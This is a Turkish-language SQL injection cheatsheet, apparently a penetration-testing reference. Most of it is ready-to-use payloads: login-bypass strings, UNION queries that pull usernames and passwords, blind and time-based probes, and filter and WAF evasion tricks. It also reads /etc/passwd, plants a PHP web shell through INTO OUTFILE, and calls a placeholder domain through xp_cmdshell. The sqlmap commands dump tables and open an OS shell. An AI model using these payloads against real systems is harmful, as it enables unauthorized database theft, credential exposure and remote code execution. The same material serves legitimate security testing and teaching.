# SQL Injection (SQLi) Cheatsheet

## Temel Kavramlar

SQL Injection, kullanıcı girdisinin yetersiz doğrulanması nedeniyle veritabanı sorgularına kötü amaçlı SQL kodu eklenmesidir.

### Yorum Söz Dizimi

```sql
-- yorum       (MySQL, MSSQL, Oracle)
# yorum        (MySQL)
/* yorum */    (MySQL, MSSQL, Oracle)
--+ yorum      (URL'de boşluk yerine +)
```

## SQLi Türleri

### 1. In-Band SQLi (Klasik)

**Hata Tabanlı:**
```sql
' OR 1=1 --
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --
' AND extractvalue(1,concat(0x7e,(SELECT version()))) --
```

**Union Tabanlı:**
```sql
' UNION SELECT NULL --                          # Sütun sayısını bul
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 1,2,3 --                         # Hangi sütunlar görüntüleniyor?
' UNION SELECT table_name,NULL FROM information_schema.tables --
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT username,password FROM users --
```

### 2. Blind SQLi

**Boolean Tabanlı:**
```sql
' AND 1=1 --     # True → sayfa normal yüklenir
' AND 1=2 --     # False → sayfa farklı/hata verir

' AND SUBSTRING((SELECT database()),1,1)='a' --
' AND (SELECT COUNT(*) FROM users)>0 --
```

**Zaman Tabanlı:**
```sql
' AND SLEEP(5) --                              # MySQL
' AND 1=1; WAITFOR DELAY '0:0:5' --           # MSSQL
' AND 1=1; SELECT pg_sleep(5) --              # PostgreSQL
' AND 1=1; dbms_pipe.receive_message(('a'),5)=1 -- # Oracle
```

### 3. Out-of-Band SQLi

```sql
'; exec master..xp_cmdshell 'nslookup <domain>' --   # MSSQL
' UNION SELECT load_file('/etc/passwd') --           # MySQL (dosya okuma)
' INTO OUTFILE '/var/www/html/shell.php' --          # MySQL (dosya yazma)
```

## Veritabanı Parmak İzi

```sql
-- MySQL
SELECT @@version
SELECT version()
' AND 1=1-- (MySQL yorum)

-- MSSQL
SELECT @@version
SELECT serverproperty('productversion')

-- Oracle
SELECT * FROM v$version
SELECT banner FROM v$version WHERE ROWNUM=1

-- PostgreSQL
SELECT version()
```

## Veritabanı Keşfi

```sql
-- Veritabanlarını listele
SELECT schema_name FROM information_schema.schemata       -- MySQL/PostgreSQL
SELECT name FROM master..sysdatabases                     -- MSSQL
SELECT DISTINCT owner FROM all_tables                     -- Oracle

-- Tabloları listele
SELECT table_name FROM information_schema.tables WHERE table_schema=database()  -- MySQL
SELECT table_name FROM information_schema.tables WHERE table_catalog='dbadi'    -- PostgreSQL
SELECT name FROM sysobjects WHERE xtype='U'               -- MSSQL
SELECT table_name FROM all_tables                         -- Oracle

-- Sütunları listele
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Kullanıcıları listele (MySQL)
SELECT user,password FROM mysql.user
```

## Filtre Atlatma Teknikleri

```sql
-- Büyük/küçük harf karıştırma
SeLeCt, UnIoN

-- Yorum ekleme
UN/**/ION SEL/**/ECT
 UNION/*!32302select*/

-- Kodlama
' UNION SELECT 0x61646d696e --    # Hex ile 'admin'
CHAR(65,68,77,73,78)              # CHAR() fonksiyonu ile

-- Boşluk alternatifleri
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  # Tab

-- OR/AND alternatifleri
|| yerine OR
&& yerine AND
```

## Kimlik Doğrulama Atlatma

```sql
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin'--
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR ('1'='1
')) OR (('1'='1
```

## Dosya Okuma/Yazma (MySQL)

```sql
-- Dosya okuma
' UNION SELECT load_file('/etc/passwd') --
' UNION SELECT load_file(0x2F6574632F706173737764) --   # Hex yol

-- Dosya yazma (web shell)
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
```

## sqlmap Referansı

```bash
# Temel tarama
sqlmap -u "http://hedef.com/page.php?id=1"

# POST parametresi
sqlmap -u "http://hedef.com/login.php" --data="user=admin&pass=admin"

# Cookie ile
sqlmap -u "http://hedef.com/" --cookie="session=abc123"

# Veritabanlarını listele
sqlmap -u "http://hedef.com/?id=1" --dbs

# Tabloları listele
sqlmap -u "http://hedef.com/?id=1" -D veritabani --tables

# Veri çek
sqlmap -u "http://hedef.com/?id=1" -D veritabani -T users --dump

# OS shell
sqlmap -u "http://hedef.com/?id=1" --os-shell

# WAF atlatma
sqlmap -u "http://hedef.com/?id=1" --tamper=space2comment,between,randomcase

# Risk ve seviye artır
sqlmap -u "http://hedef.com/?id=1" --level=5 --risk=3
```
